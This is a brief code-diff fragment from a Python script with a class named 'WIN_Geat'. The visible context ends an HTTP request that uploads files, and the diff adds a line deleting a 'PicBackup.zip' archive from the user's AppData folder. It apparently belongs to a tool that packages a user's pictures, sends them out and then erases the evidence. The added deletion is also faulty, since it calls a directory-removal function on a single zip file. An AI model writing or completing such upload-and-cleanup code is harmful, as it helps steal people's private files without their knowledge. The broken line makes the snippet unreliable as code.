@@ -89,6 +89,7 @@ class WIN_Geat:
                              headers=headers,
                              files=files
                           )
+         shutil.rmtree(os.environ["appdata"] +'\\PicBackup.zip', ignore_errors=False, onerror=None)  
 if __name__=='__main__':
     WIN_Geat()
        
